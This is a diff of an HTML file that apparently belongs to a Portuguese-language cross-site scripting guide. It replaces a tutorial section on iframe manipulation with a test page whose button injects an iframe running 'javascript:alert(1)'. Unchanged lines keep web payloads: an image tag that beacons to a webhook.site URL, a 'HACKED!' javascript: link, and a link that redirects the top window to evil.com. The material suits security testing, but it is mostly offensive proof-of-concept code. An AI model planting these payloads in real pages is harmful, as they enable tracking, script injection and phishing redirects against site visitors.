@@ -1,14 +1,28 @@
 <img src="https://webhook.site/8ca4af05-f64b-4e97-bae1-f33f6b8ffc4c"><a href="javascript:alert('HACKED!')">click</a>
 <a href="javascript:window.top.location='https://evil.com';">Abrir Exploit</a>
-top```
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iframe Injection Test</title>
+</head>
+<body>
+    <h1>Iframe Injection Test</h1>
+    <button id="inject">Inject iframe</button>
 
----
-
-### 12. **Cenários avançados: Manipulação de iframes**
-Se você pode adicionar iframes ou manipular o DOM, faça o seguinte:
-
-- Criação de um iframe para injetar código no topo:
-  ```javascript
-  let iframe = document.createElement('iframe');
-  iframe.src = 'javascript:alert(1)';
-  document.body.appendChild(iframe);
+    <script>
+        document.getElementById('inject').addEventListener('click', () => {
+            try {
+                let iframe = document.createElement('iframe');
+                iframe.src = 'javascript:alert(1)'; // Injeção no iframe
+                iframe.style.width = '100%';
+                iframe.style.height = '300px';
+                document.body.appendChild(iframe);
+            } catch (e) {
+                console.error('Injection failed:', e);
+            }
+        });
+    </script>
+</body>
+</html>
